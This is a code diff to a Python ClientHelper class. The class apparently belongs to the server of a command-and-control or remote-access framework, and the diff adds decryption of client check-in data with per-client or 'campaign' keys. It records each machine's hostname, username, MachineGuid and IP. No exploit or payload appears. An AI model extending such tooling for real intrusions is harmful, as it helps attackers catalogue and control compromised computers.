@@ -26,7 +26,7 @@ class ClientHelper:
         system_info = {}
         newly_identified = False
         first_contact = False
-        client_id = None  # No longer default to IP
+        client_id = None
         
         # Extract client ID from headers if available
         client_id_header = headers.get('X-Client-ID')
@@ -34,7 +34,21 @@ class ClientHelper:
         # Process system info if available
         if system_info_raw:
             try:
-                # Try to decrypt system info (existing code...)
+                # Try to decrypt the system info first
+                system_info_json = system_info_raw
+                
+                # If encrypted, try to decrypt it
+                if not system_info_json.startswith('{'):
+                    try:
+                        # Try with client-specific key if available
+                        if client_id_header and self._has_unique_key(client_id_header):
+                            system_info_json = self.crypto_helper.decrypt(system_info_raw, client_id_header)
+                        else:
+                            # Fall back to campaign key
+                            system_info_json = self.crypto_helper.decrypt(system_info_raw)
+                    except Exception as e:
+                        logger.warning(f"Could not decrypt system info: {e}")
+                        # Try to use it as-is if decryption fails
                 
                 # Extract the ClientId from the system info
                 try:
@@ -45,7 +59,7 @@ class ClientHelper:
                         # Use header ID if not in system info
                         client_id = client_id_header
                         
-                    # Extract other properties...
+                    # Extract other properties
                     hostname = system_info_obj.get('Hostname', 'Unknown')
                     username = system_info_obj.get('Username', 'Unknown')
                     machine_guid = system_info_obj.get('MachineGuid', 'Unknown')
@@ -56,8 +70,15 @@ class ClientHelper:
                     # Add IP to system info
                     system_info['ip'] = client_ip
                     
+                    # Add campaign folder info for later use
+                    if hasattr(self.server, 'campaign_name'):
+                        campaign_folder = f"{self.server.campaign_name}_campaign"
+                        system_info['campaign_folder'] = campaign_folder
+                    
+                    logger.info(f"Extracted system info - Hostname: {hostname}, Username: {username}")
+                    
                 except Exception as e:
-                    logger.error(f"Error extracting client ID: {str(e)}")
+                    logger.error(f"Error extracting client info: {str(e)}")
                     # If we can't get a client ID, use IP as fallback
                     client_id = client_ip
                     
@@ -87,7 +108,7 @@ class ClientHelper:
                     os_version=os_version,
                     mac_address=mac_address,
                     system_info=system_info,
-                    client_id=client_id  # Pass client ID to add_client
+                    client_id=client_id
                 )
                     
             except Exception as e:
